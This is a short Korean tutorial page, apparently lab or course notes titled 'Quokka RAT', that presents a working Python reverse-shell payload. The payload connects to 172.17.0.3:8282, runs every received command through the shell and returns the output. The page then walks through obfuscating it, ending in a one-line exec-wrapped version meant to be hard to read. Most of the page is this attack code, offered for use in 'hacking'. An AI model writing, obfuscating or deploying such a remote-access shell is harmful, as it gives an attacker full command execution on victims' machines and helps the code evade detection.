# Quokka RAT : 페이로드

<aside>
⚠️ author : 전재호(agamtt) 2024-03-17
contributor : 손기민(KiminSon) 2024-04-08

</aside>

# 페이로드(Payload)

페이로드(Payload) 는 내용물이라는 뜻으로, 해킹에서는 악성행위에 쓰이는 데이터를 말합니다.

우리가 만든 악성코드는 이렇게 생겼습니다. 불필요한 스페이스바 등을 지워서 페이로드를 작게 만듭시다.

```python
import socket
import subprocess

host = "172.17.0.3"
port = 8282

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    command = s.recv(1024).decode()
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True)
    result = output.stdout
    if(result==''):
        s.send("success".encode())
    else:
        s.send(result.encode())
```

이제 띄어쓰기도 좀 줄이고, 알아보기 힘들게 바꿉니다.

```python
import socket
import subprocess
h="172.17.0.3"
p=8282
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((h,p))
while True:
    c=s.recv(1024).decode()
    output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
    result=output.stdout
    if(result==''):
        s.send("suc".encode())
    else:
        s.send(result.encode())
```

이제 이것을 이용하여 해킹을 진행해보겠습니다.

## 더 줄이기 : 세미콜론으로 한줄 코드 만들기

파이썬은 줄바꿈 말고도 세미콜론(;)으로 코드를 구분할 수 있습니다.
이렇게 만들면 더 알아보기 힘듭니다.

```python
import socket,subprocess;h,p="172.17.0.3",8282;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((h,p));exec("while True:c=s.recv(1024).decode();o=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True);r=o.stdout;s.send('suc'.encode()) if not r else s.send(r.encode())")
```

계속